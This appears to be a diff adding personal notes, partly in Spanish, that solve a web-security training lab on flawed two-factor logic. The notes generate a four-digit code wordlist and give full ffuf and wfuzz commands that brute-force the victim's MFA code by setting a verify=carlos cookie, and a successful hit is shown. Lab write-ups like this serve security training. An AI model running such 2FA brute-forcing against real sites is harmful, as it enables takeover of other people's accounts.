@@ -1,0 +1,36 @@
+ This lab's two-factor authentication is vulnerable due to its flawed logic. To solve the lab, access Carlos's account page.
+
+    Your credentials: wiener:peter
+    Victim's username: carlos
+
+    verify=wiener
+
+You also have access to the email server to receive your 2FA verification code. 
+
+
+para la lista de numeros
+
+seq -w 0000 9999 > wordlist.txt
+
+probamos con tools gratis
+
+ffuf -u https://0a2600e8041037c88091e4a700b9009c.web-security-academy.net/login2 \
+-X POST \
+-H "Host: 0a2600e8041037c88091e4a700b9009c.web-security-academy.net" \
+-H "Cookie: session=e2jL4yhP5XAgXuij6SHzZVR9lCHKYof6; verify=carlos" \
+-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-d "mfa-code=FUZZ" \
+-w wordlist.txt \
+-mc all -fs 3500
+
+0481                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 132ms]
+
+
+wfuzz -u https://0a2600e8041037c88091e4a700b9009c.web-security-academy.net/login2 \
+-d "mfa-code=FUZZ" \
+-H "Host: 0a2600e8041037c88091e4a700b9009c.web-security-academy.net" \
+-H "Cookie: session=QOTk3gkApy299Gymi4buU0FiZhsTfqgT; verify=carlos" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-w wordlist.txt \
+-mc 302 
